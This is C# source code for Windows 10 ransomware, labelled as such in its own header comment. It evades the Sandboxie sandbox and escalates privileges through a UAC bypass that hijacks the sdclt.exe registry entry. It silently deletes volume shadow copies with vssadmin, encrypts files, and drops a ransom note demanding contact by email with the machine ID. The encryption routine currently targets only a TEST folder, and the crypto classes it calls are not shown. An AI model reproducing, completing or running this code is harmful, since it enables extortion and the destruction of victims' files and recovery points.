using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;

namespace Ransomware10
{

    /// <summary>
    /// The Fastest Most Lightweight Ransomware Targetting Windows 10. @Choudai
    /// </summary>
    
    class Main
    {
        private static string[] Files = null;
        private static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        private static string Apps = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        private static string ID = Environment.MachineName;
        private static string Assembly = System.Reflection.Assembly.GetEntryAssembly().Location;
        private static RegistryKey Check = Registry.CurrentUser.OpenSubKey("Software\\" + ID);

        [STAThread]
        static void Main()
        {
            Sandboxie();
            if (IsWindows10())
            {
                Elevate();
                Mutex();
                Recovery();
                try
                {
                Encrypt();
                }
                catch { };
                Note();
                Environment.Exit(0);
            }
            else
            {
                Environment.Exit(0);
            }
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        private static void Sandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            {
                Environment.Exit(0);
            }
        }

        static bool IsWindows10()
        {
            var Name = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
            string productName = (string)Name.GetValue("ProductName");
            return productName.StartsWith("Windows 10");
        }
        
        private static void Elevate()
        {
            if ((new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Admi​nistrator) == false)
            {
                Registry.CurrentUser.CreateSubKey("Software\\Classes\\exefile\\shell\\runas\\command").SetValue("isolatedCommand", Assembly);
                Process.Start("sdclt.exe /kickoffelev");
                Registry.CurrentUser.DeleteSubKey("Software\\Classes\\exefile\\shell\\runas\\command");
                Environment.Exit(0);
            }
        }

        private static void Mutex()
        {
            bool x;
            Mutex m = new Mutex(true, "Dupe", out x);
            if (!x)
            {
                Environment.Exit(0);
            }
            else
            {
                Once();
            }
        }

        private static void Once()
        {
            try
            {
                Object N = Check.GetValue("Installed");
                if (N != null)
                {
                    Environment.Exit(0);
                }
            }
            catch { };
        }

        private static void Recovery()
        {
            try
            {
                Process cmd = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/c vssadmin delete shadows /all /quiet";
                startInfo.Verb = "runas";
                cmd.StartInfo = startInfo;
                cmd.Start();
            }
            catch { };
        }

        private static void Encrypt()
        {
            Files = Directory.GetFiles(Desktop + "\\TEST");
            ISAAC csprng = Crypt.PrepareKey();
            if (csprng == null) return;
            foreach (string Phile in Files)
            {
                Crypt.CryptFile(csprng, new byte[] { 0x54, 0x45, 0x53, 0x54, 0x4B, 0x45, 0x59 }, Phile);
            }
        }

        private static void Note()
        {
            string[] Lines = { "SORRY! Your files have been encrypted and obfuscated.", "File contents are encrypted with a random key and are not usable. (XOR-ISAAC).", "Do not try to decrypt the files using tools or services.", "These may damage your data making recovery IMPOSSIBLE!", "If you wish to decrypt your files for the lowest price possible you must contact us.", "We can be reached by the following emails:", "", "decryptme@gmail.com", "You MUST include this ID in your message: " + ID, "", "If you do not recieve a reply within 48 hours do not panic.", "Only we can sucessfully decrypt your files; knowing this will protect you from fraud.", "Follow the instructions you recieve on what to do next carefully." };
            File.WriteAllLines(Desktop + "\\R3AD_M3.txt", Lines);
            Registry.CurrentUser.CreateSubKey("Software\\" + ID).SetValue("Installed", "1");
        }
    }
}
